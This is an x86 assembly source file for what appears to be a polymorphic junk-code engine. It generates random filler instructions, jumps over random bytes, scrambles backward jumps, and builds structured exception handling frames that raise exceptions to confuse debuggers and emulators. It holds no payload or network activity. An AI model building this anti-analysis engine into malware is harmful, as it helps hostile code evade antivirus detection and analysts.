M0_EAX			equ	0
M0_ECX			equ	1
M0_EDX			equ	2
M0_EBX			equ	3
M0_ESI			equ	4
M0_EDI			equ	5

M1_EAX			equ	0
M1_ECX			equ	1
M1_EDX			equ	2
M1_EBX			equ	3
M1_ESI			equ	6
M1_EDI			equ	7


M2_EAX			equ	0 shl 3
M2_ECX			equ	1 shl 3
M2_EDX			equ	2 shl 3
M2_EBX			equ	3 shl 3
M2_ESI			equ	6 shl 3
M2_EDI			equ	7 shl 3

; -------------- MAIN REGISTERS TABLES ----------------------------------------

x1_table:		db	M1_EAX
			db	M1_ECX
			db	M1_EDX
			db	M1_EBX
			db	M1_ESI
			db	M1_EDI
x1_tbl_size		=	$ - offset x1_table

x2_table:		db	M2_EAX
			db	M2_ECX
			db	M2_EDX
			db	M2_EBX
			db	M2_ESI
			db	M2_EDI
x2_tbl_size		=	$ - offset x2_table


; -------------- INSTRUCTION TABLES -------------------------------------------
; FORMAT:       (1 BYTE)  (BYTE)   (BYTE)  (BYTE)
; 		<OPCODE>  <MODRM>  <LEN>   <CSET>
; 
; if there is no MODRM, MODRM must be set to 2Dh (temp)

NO_M		equ	02dh
C_NONE		equ	0
C_SRC		equ	1
C_DST		equ	2
C_BOTH		equ	3



allowed_regs:	db	M0_EAX, M0_ECX, M0_EDX, M0_EBX, M0_ESI, M0_EDI
instr_table:	db	0f9h, NO_M, 1h, C_NONE			; stc
		db	0EBh, NO_M, 2h, C_NONE			; jmp $+1
		db  	0c7h, 0c0h, 6h, C_SRC			; mov reg(EAX),NUM
		db	08bh, 0c0h, 2h, C_BOTH			; mov reg(EAX),reg(EAX)
		db	081h, 0c0h, 6h, C_SRC			; add reg(EAX),NUM
		db	003h, 0c0h, 2h, C_BOTH			; add reg(EAX),reg(EAX)
		db	081h, 0e8h, 6h, C_SRC			; sub reg(EAX),NUM
		db	02bh, 0c0h, 2h,	C_BOTH			; sub reg(EAX),reg(EAX)
		db	040h, NO_M, 1h,	C_SRC			; inc reg(EAX)
		db	048h, NO_M, 1h, C_SRC			; dec reg(EAX)
_i_xor_r	db	033h, 0c0h, 2h, C_BOTH			; xor reg(EAX),reg(EAX)
		db	009h, 0c0h, 2h, C_BOTH			; or reg(EAX),reg(EAX)
		db	081h, 0c8h, 6h, C_SRC			; or reg(EAX),NUM
		db	03bh, 0c0h, 2h, C_BOTH
		db	085h, 0c0h, 2h, C_BOTH
		db	01bh, 0c0h, 2h, C_BOTH			; sbb reg(EAX),reg(EAX)
		db	011h, 0c0h, 2h, C_BOTH			; adc reg(EAX),reg(EAX)
		db	0f7h, 0d0h, 2h, C_SRC			; not reg(EAX)
		db	0f7h, 0d8h, 2h, C_SRC			; neg reg(EAX)
		db	0d1h, 0f8h, 2h, C_SRC			; sar reg(EAX),1
		db	0d1h, 0d8h, 2h, C_SRC			; rcr reg(EAX),1
		db	0d1h, 0d0h, 2h, C_SRC			; rcl reg(EAX),1		
		db	091h, NO_M, 1h, C_SRC			; xchg reg(EAX),reg(ECX)
		db	090h, NO_M, 1h, C_NONE			; nop
		db	0fch, NO_M, 1h, C_NONE			; cld
		db	0f8h, NO_M, 1h, C_NONE			; clc
		db	0fdh, NO_M, 1h, C_NONE			; std
		db	09bh, NO_M, 1h, C_NONE			; wait		
		db	050h, NO_M, 1h, C_SRC			; push reg(eax)
_i_pop		db	058h, NO_M, 1h, C_SRC			; pop reg(eax) (must be last one)
ENTRY_TABLE_SIZE	=	4
instr_table_size	=	(($-offset instr_table)/4)

		dd	0
push_number	dd	0
do_push		db	1					; should we process pushs?

O_JMP		equ	0EBh
O_PUSH		equ	050h
O_POP		equ	058h
i_jmp:		db	0EBh, NO_M, 2h 				; jmp $+1

		

; -------------- GARBAGE GENERATOR (SAFE) ------------------------------------
; EDI = where
; ----------------------------------------------------------------------------

gen_garbage_i:

		pushad
garbage_again:
		mov	eax,instr_table_size
		call	random_eax

		lea	esi,instr_table	
		mov	ecx,ENTRY_TABLE_SIZE
		mul	ecx				; eax=member from table to use
		add	esi,eax
		jmp	garbage_co

garbage_hand:	pushad
garbage_co:	lodsw					; ah = modrm value / al=opcode
		cmp	ah,NO_M
		je	no_modrm
		stosb					; store opcode
		xor	edx,edx
		mov	dl,ah
		cmp	byte ptr [esi+1],C_BOTH		; what registers to mutate
		je	p_01
		cmp	byte ptr [esi+1],C_SRC
		jne	t_01

p_01:		and	dl,0F8h		
		mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]
		or	dl,al
		mov	byte ptr [edi],dl

t_01:		cmp	byte ptr [esi+1],C_BOTH		; what registers to mutate
		je	p_02
		cmp	byte ptr [esi+1],C_DST
		jne	finish_i

p_02:		and	dl,0C7h	
		mov	eax,x2_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x2_table[eax]]
		or	dl,al				; update modrm value
		mov	byte ptr [edi],dl

finish_i:	mov	cl,byte ptr [esi]
		sub	cl,2
		inc	edi
		cmp	cl,0
		jle	garbage_done

store_op:	mov	eax,12345678h
		call	random_eax
		stosb				
		loop	store_op


garbage_done:	xor	eax,eax
		mov	al,byte ptr [esi]
		mov	[esp+PUSHA_STRUCT._EAX],eax
		popad
		ret
			
		
; ----------------------------------------------------
; NO MOD-RMs
; ----------------------------------------------------


no_modrm:	xor	edx,edx
		mov	dl,al

		cmp	byte ptr [esi+1],C_NONE
		je	t_none
		cmp	dl,O_PUSH
		je	t_push
		cmp	dl,O_POP
		je	t_pop 


go_nomodrm:	mov	eax,x1_tbl_size
		call	random_eax
		mov	al,byte ptr [allowed_regs[eax]]
		mov	al,byte ptr [x1_table[eax]]
		and	dl,0F8h
		or	dl,al
		mov	byte ptr [edi],dl
		inc	edi
		jmp	finish_i
		
t_none:		mov	byte ptr [edi],dl
		inc	edi
		cmp	dl,O_JMP
		jne 	finish_i
		mov	byte ptr [edi],0
		inc	edi
		jmp 	finish_i		

t_push:		cmp	byte ptr [do_push],1
		jne	garbage_again
		inc	dword ptr [push_number]
		jmp	go_nomodrm

t_pop:		cmp	byte ptr [do_push],1
		jne	garbage_again

		cmp	dword ptr [push_number],0
		jle	garbage_again

		dec	dword ptr [push_number]
		jmp 	go_nomodrm



t_normalize_pops:

		pushad
		xor	ebx,ebx
		mov	ecx,dword ptr [push_number]
		test	ecx,ecx
		jz	t_opsexit
		
		
t_givepops:	lea	esi,_i_pop
		call	garbage_hand
		add	edi,eax
		add	ebx,eax
		loop	t_givepops

t_opsexit:	mov	[esp+PUSHA_STRUCT._EAX],ebx
		popad
		ret
		
		
; ---------------------------------------------------------------------------
; HARDCORE GARBAGER
; ---------------------------------------------------------------------------
; EDI = where to store 
;
; This one generates code like this:
; jmp over_garbage
; <totally random generated garbage>
; <normal garbage>
; max: up to 20 "instructions"
; ---------------------------------------------------------------------------

hardcode_garbage_i:
		
		pushad
		mov	ebx,edi
		lea	edi,hardcore_temp
		mov	eax,20			
		call	random_eax
		mov	ecx,eax
		add	ecx,4

h_fill:		mov	eax,2
		call	random_eax
		test 	eax,eax
		jnz	h_hard
		call	gen_garbage_i
		jmp	h_cont

h_hard:		mov	eax,5
		call	random_eax
		mov	edx,eax
		inc	edx
		xor	esi,esi

h_hard_fill:	mov	eax,0FFFFh
		call	random_eax
		stosb
		inc	esi
		dec	edx
		jnz	h_hard_fill		
		loop	h_fill
		jmp	h_done

h_cont:		add	edi,eax
		loop	h_fill
	
h_done:		lea	ecx,hardcore_temp
		sub	edi,ecx
		mov	ecx,edi				
							
		mov	byte ptr [ebx],O_JMP
		inc	ebx
		mov	byte ptr [ebx],cl
		inc	ebx

		push	ecx
		mov	edi,ebx
		lea	esi,hardcore_temp
		rep	movsb
		pop	eax
		add	eax,2

		mov	[esp+PUSHA_STRUCT._EAX],eax
		popad
		ret

; -------------------------------------------------------------
; Generates backwards jumps
; -------------------------------------------------------------
; EDI = buffor

gen_bjumps:

		pushad
		mov	ebx,edi	
		mov	byte ptr [jmp_flag],0
		mov	byte ptr [jmp_flag_b],0
		mov	dword ptr [count_jmp],0
		mov	dword ptr [where_where],0
		mov	dword ptr [jmp_bytes],0
		mov	byte ptr [do_push],0
		mov	byte ptr [where_losed],0

		mov	byte ptr [ebx],O_JMP
		mov	dword ptr [where_start],ebx
		add	dword ptr [where_start],2
		inc	ebx
		
		xor	esi,esi
		add	edi,2			
		add	dword ptr [jmp_bytes],2

gen_gar_i:	mov	eax,20			
		call	random_eax
		mov	ecx,eax
		add	ecx,10
		
gen_gar_ii:	call 	gen_garbage_i
		add	dword ptr [jmp_bytes],eax
		add	esi,eax
		add	edi,eax
		cmp	byte ptr [jmp_flag],1
		jne	gen_gari_ix
		add	dword ptr [count_jmp],eax
		jmp	gen_gari_ixx

gen_gari_ix:	push	eax
		mov	eax,2
		call	random_eax
		mov	edx,eax
		pop	eax
		cmp	byte ptr [where_losed],1
		je	gen_gari_ixx
		add	dword ptr [where_start],eax
		cmp	edx,1
		je	gen_gari_ixx
		mov	byte ptr [where_losed],1		

gen_gari_ixx:	mov	eax,3
		call	random_eax
		cmp	eax,2
		jne	cont_gari
		cmp	byte ptr [jmp_flag],1
		je	cont_gari
		mov	byte ptr [jmp_flag],1
		mov	byte ptr [edi],O_JMP	
		inc	edi
		mov	dword ptr [where_jmp],edi
		inc	edi
		add	esi,2

cont_gari:	loop	gen_gar_ii
		mov	eax,esi
		mov	byte ptr [ebx],al
		cmp	byte ptr [jmp_flag],1
		je	cont_gari2
		mov	byte ptr [edi],O_JMP
		inc	edi
		mov	dword ptr [where_jmp],edi
		inc	edi

cont_gari2:	mov	dword ptr [where_where],edi			
		add	dword ptr [jmp_bytes],2
		mov	eax,5
		call	random_eax
		inc	eax
		mov	ecx,eax

cont_gari3:	call 	gen_garbage_i
		add	dword ptr [jmp_bytes],eax
		add	edi,eax
		add	dword ptr [count_jmp],eax
		loop	cont_gari3
		mov	byte ptr [edi],O_JMP
		mov	eax,edi
		sub	eax,dword ptr [where_start]
		add	eax,2
		neg	eax

		pushad
		add	edi,2
		mov	eax,4
		call	random_eax
		mov	ecx,eax
		test 	ecx,ecx
		jz	cont_gari4

place_gar:	mov	eax,0FFh
		call	random_eax
		inc	dword ptr [count_jmp]
		inc	dword ptr [jmp_bytes]
		stosb
		loop	place_gar


cont_gari4:	add	dword ptr [count_jmp],2
		mov	eax,dword ptr [count_jmp]
		mov	edx,dword ptr [where_jmp]
		mov	byte ptr [edx],al		
		popad
		mov	byte ptr [edi+1],al
		add	dword ptr [jmp_bytes],2
		mov	edx,dword ptr [where_where]
		sub	edx,dword ptr [where_jmp]
		dec	edx
		mov	ecx,edx
		mov	edx,dword ptr [where_jmp]
		inc	edx
		cmp	ecx,0
		jle 	cont_no_xor
				
cont_xor:	mov	eax,0FFh
		call	random_eax
		xor	byte ptr [edx],al
		inc	edx
		loop	cont_xor

cont_no_xor:	mov	byte ptr [do_push],1
		mov	edx,dword ptr [jmp_bytes]
		mov	[esp+PUSHA_STRUCT._EAX],edx
		popad
		ret

jmp_bytes	dd	0
where_losed	db	0
where_where	dd	0
where_start	dd	0
count_jmp	dd	0
where_jmp	dd	0
jmp_flag	db	0
jmp_flag_b	db	0





; -------------------------------------------------------------
; Generates SEH frames/exceptions/etc.
; -------------------------------------------------------------
; EDI = buffor


FS_PREFIX	equ	064h
seh_push_fs	db	0ffh, 030h, 2h, C_SRC
seh_mov_fs	db	089h, 020h, 2h, C_SRC
seh_pop_fs	db	08fh, 000h, 2h, C_SRC

_mov_reg_esp	db	08bh, 0c4h, 2h, C_DST		; mov reg,ESP
_add_reg_num	db	081h, 0c0h, 2h, C_SRC		; add reg,NUM (we must typo NUM by hand: 4) LEN=6
_mov_reg_oreg	db	08bh, 000h, 2h, C_BOTH		; mov reg,[REG]
_mov_dreg_num	db	0c7h, 080h, 2h, C_SRC		; mov [reg+NUM],0 (add NUM by hand) LEN: A
_add_dreg_num	db	081h, 080h, 2h, C_SRC

exception_table:
		db	0CCh				; int 3
		db	0fah				; cli
		db	0fbh				; sti
exception_table_size	= $-offset exception_table






gen_seh:
		pushad
		xor	edx,edx
		mov	ebx,edi
		mov	byte ptr [edi],0E8h		
		mov	dword ptr [edi+1],0
		add	edx,5
		add	edi,5
		push	edi
		lea 	esi,allowed_regs		
		mov	ecx,x1_tbl_size
		push	esi
		push	ecx
		lea	edi,allowed_regs_temp
		rep	movsb
		pop	ecx
		pop	edi

		pushad
		mov	eax,x1_tbl_size		  
		call	random_eax
		cmp	eax,M0_EAX
		jne	reg_p
		inc	eax			 ; somehow :) EAX usage results with invalid disposition error

reg_p:		rep	stosb
		mov	edi,[esp+PUSHA_STRUCT_SIZE]
		lea	esi,_mov_reg_esp			
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],eax
		add	[esp+PUSHA_STRUCT_SIZE],eax
		add	edi,eax
		lea	esi,_add_reg_num
		call	garbage_hand
		add	edi,2
		mov	dword ptr [edi],0Ch
		add	dword ptr [esp+PUSHA_STRUCT._EDX],6
		add	[esp+PUSHA_STRUCT_SIZE],6
		add	edi,4
		lea	esi,_mov_reg_oreg			
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],eax
		add	[esp+PUSHA_STRUCT_SIZE],eax
		add	edi,eax
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],04h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],08h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],12h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2		
		lea	esi,_mov_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah
		add	[esp+PUSHA_STRUCT_SIZE],0ah
		add	edi,2
		mov	dword ptr [edi],16h
		mov	dword ptr [edi+4],0h
		add	edi,0ah-2		
		lea	esi,_add_dreg_num
		call	garbage_hand
		add	dword ptr [esp+PUSHA_STRUCT._EDX],0ah+1
		add	[esp+PUSHA_STRUCT_SIZE],0ah+1
		add	edi,2
		mov	dword ptr [edi],0b8h
		add	edi,4
		mov	dword ptr [where_over],edi
		add	edi,0ah-6
		mov	byte ptr [edi],0C3h		; ret
		inc	edi
		popad
		mov	byte ptr [ebx+1],dl		
		sub	byte ptr [ebx+1],5
		mov	eax,x1_tbl_size			
		call	random_eax
		rep	stosb
		pop	edi
		lea	esi,_i_xor_r			
		call	garbage_hand
		add	edi,eax
		add	edx,eax
		mov	byte ptr [edi],FS_PREFIX
		inc	edi	
		inc	edx	
		lea	esi,seh_push_fs
		call	garbage_hand			
		add	edi,eax
		add	edx,eax
		mov	byte ptr [edi],FS_PREFIX	
		inc	edi
		inc	edx
		lea	esi,seh_mov_fs
		call	garbage_hand
		add	edi,eax
		add	edx,eax
		call	reset_regs
		xor	ebx,ebx
		mov	eax,exception_table_size
		call	random_eax
		mov	cl,byte ptr exception_table[eax]
		mov	byte ptr [edi],cl
		inc	edx
		inc	edi
		inc	ebx
		call	fill_trash
		add	edx,eax		
		add	ebx,eax
		add	edi,eax
		push	edi
		mov	edi,dword ptr [where_over]
		mov	dword ptr [edi],ebx
		pop	edi
		call	finalize_seh
		add	edx,eax
		mov	[esp+PUSHA_STRUCT._EAX],edx
		popad
		ret



where_over		dd	0
allowed_regs_temp	db	x1_tbl_size dup (0)




finalize_seh:
		pushad
		call	gen_regs
		xor	edx,edx
		lea	esi,_i_xor_r			
		call	garbage_hand
		add	edi,eax
		add	edx,eax
		mov	byte ptr [edi],FS_PREFIX
		inc	edi
		inc	edx
		lea	esi,seh_pop_fs
		call	garbage_hand			
		add	edi,eax
		add	edx,eax
		call	reset_regs
		inc	dword ptr [push_number]
		lea	esi,_i_pop
		call	garbage_hand			
		add	edx,eax
		add	edi,eax
		mov	[esp+PUSHA_STRUCT._EAX],edx		
		popad
		ret

fill_trash:	pushad
		xor	ebx,ebx
		mov 	eax,20
		call	random_eax
		mov	ecx,eax
		test	eax,eax
		jz 	done_fill_trash

fill_trash_x:	mov	eax,0FFh
		call	random_eax
		stosb
		inc	ebx
		loop	fill_trash_x

done_fill_trash:
		mov	[esp+PUSHA_STRUCT._EAX],ebx
		popad
		ret

reset_regs:
		pushad	
		lea	esi,allowed_regs_temp
		mov	ecx,x1_tbl_size
		lea	edi,allowed_regs
		rep	movsb
		popad
		ret


gen_regs:	pushad
		mov	eax,x1_tbl_size
		call	random_eax
		lea	edi,allowed_regs
		mov	ecx,x1_tbl_size
		rep	stosb		
		popad
		ret


set_random:	pushad
		mov	eax,6
		call	random_eax
		cmp	eax,5
		jne	not_set
		call	gen_bjumps		
		jmp	le_set

not_set:	xor	eax,eax
le_set:		mov	[esp+PUSHA_STRUCT._EAX],eax

		popad
		ret


random_setup			proc

		@callx GetTickCount
		mov Random_Seed,eax
		ret

random_setup			endp

Random_Seed			dd 0

random_eax			proc

                PUSH    ECX
                PUSH    EDX
                PUSH    EAX
		db      0Fh, 31h	       ; RDTSC
                MOV     ECX, Random_Seed  
                ADD     EAX, ECX  
                ROL     ECX, 1 
                ADD     ECX, 666h
                MOV     Random_Seed, ECX
	        PUSH    32
                POP     ECX

CRC_Bit:        SHR     EAX, 1      
                JNC     Loop_CRC_Bit
                XOR     EAX, 0EDB88320h

Loop_CRC_Bit:   LOOP    CRC_Bit 
                POP     ECX     
                XOR     EDX, EDX 
                DIV     ECX
                XCHG    EDX, EAX                
                OR      EAX, EAX                
                POP     EDX
                POP     ECX
                RETN
random_eax			  endp 
